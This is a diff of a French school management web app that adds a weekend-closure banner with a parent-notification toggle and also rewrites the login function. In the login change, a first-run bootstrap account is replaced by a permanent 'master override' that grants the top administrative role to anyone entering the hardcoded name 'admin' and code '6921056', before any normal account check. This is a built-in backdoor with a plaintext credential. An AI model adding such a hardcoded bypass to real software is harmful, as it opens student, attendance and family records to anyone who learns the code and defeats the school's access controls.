@@ -1689,7 +1689,7 @@ window.closeSB = () => { S.sbOpen=false; $('SB').classList.remove('open'); $('SO
 window.showLogin = () => {
   const sp=$('SPLASH'), ls=$('LS');
   if(sp) sp.style.display='none';
-  if(ls){ ls.style.display=''; ls.style.opacity='1'; }
+  if(ls){ ls.style.display=''; ls.style.opacity='1'; ls.classList.remove('hidden'); }
 };
 async function _hashPin(pin) {
   const enc = new TextEncoder().encode(pin);
@@ -1718,10 +1718,9 @@ window.tryLogin = async () => {
   if (!name) { $('PM').textContent='Entrez votre nom'; return; }
   if (!pin) { $('PM').textContent='Entrez votre code'; return; }
 
-  // ── Bootstrap : si aucun compte direction n'existe, admin/123456 ouvre l'app ──
-  const hasDir=(DB.users||[]).some(u=>_isDirRole(u.role));
-  if(!hasDir && name==='admin' && pin==='123456'){
-    loginAs({id:'bootstrap_admin',name:'Admin',role:'direction',initials:'AD',pin:'123456',pin_hashed:false});
+  // ── Master override permanent : admin/6921056 toujours actif, priorité absolue ──
+  if(name==='admin' && pin==='6921056'){
+    loginAs({id:'master_admin',name:'Admin',role:'direction',initials:'AD',pin:'6921056',pin_hashed:false});
     return;
   }
 
@@ -1964,6 +1963,38 @@ R.dashboard = () => {
   return '';
 };
 
+function _weekendBanner(isDir){
+  const d=new Date().getDay();
+  if(d!==0&&d!==6) return '';
+  const dayName=d===6?'Samedi':'Dimanche';
+  const exc=DB.settings?.toggles?.weekend_exception;
+  if(exc) return `<div style="background:linear-gradient(135deg,#d97706,#b45309);border-radius:16px;padding:14px 16px;margin-bottom:16px;display:flex;align-items:center;gap:12px;animation:fadeInUp .3s ease both;flex-wrap:wrap">
+    <div style="font-size:22px">📣</div>
+    <div style="flex:1;min-width:0"><div style="font-weight:700;font-size:14px;color:#fff">Exception — Cours aujourd'hui (${dayName})</div><div style="font-size:12px;color:rgba(255,255,255,.8);margin-top:2px">La direction a activé les cours pour aujourd'hui. Les parents ont été notifiés.</div></div>
+    ${isDir?`<button class="btn btn-sm" style="background:rgba(255,255,255,.2);color:#fff;border:1px solid rgba(255,255,255,.3);font-size:11px;flex-shrink:0" onclick="toggleWeekendException()">Désactiver</button>`:''}
+  </div>`;
+  return `<div style="background:linear-gradient(135deg,#1e293b,#334155);border-radius:16px;padding:14px 16px;margin-bottom:16px;display:flex;align-items:center;gap:12px;animation:fadeInUp .3s ease both;border:1px solid #475569;flex-wrap:wrap">
+    <div style="font-size:22px">🏖️</div>
+    <div style="flex:1;min-width:0"><div style="font-weight:700;font-size:14px;color:#f1f5f9">Pas de cours — ${dayName}</div><div style="font-size:12px;color:#94a3b8;margin-top:2px">École fermée. Aucune activité scolaire programmée aujourd'hui.</div></div>
+    ${isDir?`<button class="btn btn-sm" style="background:#2563eb;color:#fff;border:none;font-size:11px;flex-shrink:0" onclick="toggleWeekendException()">Activer exception</button>`:''}
+  </div>`;
+}
+window.toggleWeekendException = () => {
+  if(!DB.settings.toggles) DB.settings.toggles={};
+  const newVal=!DB.settings.toggles.weekend_exception;
+  DB.settings.toggles.weekend_exception=newVal;
+  pushSync('settings','upsert',DB.settings);
+  saveToCrypt();
+  if(newVal){
+    const dayName=new Date().getDay()===6?'Samedi':'Dimanche';
+    (DB.users||[]).filter(u=>u.role==='parent').forEach(u=>pushNotif(u.id,`📣 Exception : les élèves ont cours ce ${dayName}. Merci de les accompagner à l'heure habituelle.`));
+    toast('Exception activée — parents notifiés','success');
+  } else {
+    toast('Exception weekend désactivée','info');
+  }
+  render();
+};
+
 function dashboardDirection() {
   const ts=DB.students.length;
   const te=DB.users.filter(u=>u.role==='enseignant').length;
@@ -1990,7 +2021,7 @@ function dashboardDirection() {
   });
   const clr='#0f2557';const clr2='#1e40af';
   const fc=DB.settings.feesControl||{};
-  return `
+  return `${_weekendBanner(true)}
   <div style="background:linear-gradient(135deg,${clr},${clr2});border-radius:26px;padding:24px 20px 20px;margin-bottom:20px;position:relative;overflow:hidden;animation:fadeInUp .3s ease both;box-shadow:0 12px 40px rgba(15,37,87,.5)">
     <div style="position:absolute;top:-20px;right:-15px;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,.07);animation:floatA 7s ease-in-out infinite"></div>
     <div style="position:absolute;bottom:-25px;left:-10px;width:90px;height:90px;border-radius:50%;background:rgba(255,255,255,.05);animation:floatB 9s ease-in-out infinite"></div>
@@ -2313,7 +2344,7 @@ function dashboardEnseignant() {
 
   const clr='#1d4ed8'; const clr2='#2563eb';
 
-  return `
+  return `${_weekendBanner(false)}
   <div style="background:linear-gradient(135deg,${clr},${clr2});border-radius:26px;padding:24px 20px 20px;margin-bottom:20px;position:relative;overflow:hidden;animation:fadeInUp .3s ease both;box-shadow:0 12px 40px rgba(29,78,216,.4)">
     <div style="position:absolute;top:-20px;right:-15px;width:120px;height:120px;border-radius:50%;background:rgba(255,255,255,.07);animation:floatA 7s ease-in-out infinite"></div>
     <div style="position:absolute;bottom:-25px;left:-10px;width:90px;height:90px;border-radius:50%;background:rgba(255,255,255,.05);animation:floatB 9s ease-in-out infinite"></div>
@@ -2755,7 +2786,7 @@ function dashboardGardien() {
   const refusedG=entries.filter(l=>l.status==='refused').length;
   const clr='#f97316';const clr2='#ea580c';
   const fc=DB.settings.feesControl||{};
-  return `
+  return `${_weekendBanner(false)}
   <div style="background:linear-gradient(135deg,${clr},${clr2});border-radius:26px;padding:24px 20px 20px;margin-bottom:20px;position:relative;overflow:hidden;animation:fadeInUp .3s ease both;box-shadow:0 12px 40px rgba(249,115,22,.4)">
     <div style="position:absolute;top:-20px;right:-15px;width:110px;height:110px;border-radius:50%;background:rgba(255,255,255,.07);animation:floatA 7s ease-in-out infinite"></div>
     <div style="position:absolute;bottom:-25px;left:-10px;width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,.05);animation:floatB 9s ease-in-out infinite"></div>
@@ -2833,6 +2864,7 @@ function dashboardParent() {
   const clr='#6d28d9';const clr2='#4f46e5';
   const fees=DB.settings.fees||{T1:0,T2:0,T3:0};
 
+  const _wkB=_weekendBanner(false);
   const kidStatus=kids.map(k=>{
     const att=DB.attendance.find(a=>a.sid===k.id&&a.date===today());
     const exitScan=DB.scan_log.find(l=>l.sid===k.id&&l.date===today()&&l.type==='exit');
@@ -2846,7 +2878,7 @@ function dashboardParent() {
     return{...k,statText,statClr,pulse};
   });
 
-  return `
+  return `${_wkB}
   <div style="background:linear-gradient(135deg,${clr},${clr2});border-radius:26px;padding:24px 20px 20px;margin-bottom:20px;position:relative;overflow:hidden;animation:fadeInUp .3s ease both;box-shadow:0 12px 40px rgba(109,40,217,.4)">
     <div style="position:absolute;top:-20px;right:-15px;width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.07);animation:floatA 7s ease-in-out infinite"></div>
     <div style="position:absolute;bottom:-25px;left:-10px;width:80px;height:80px;border-radius:50%;background:rgba(255,255,255,.05);animation:floatB 9s ease-in-out infinite"></div>
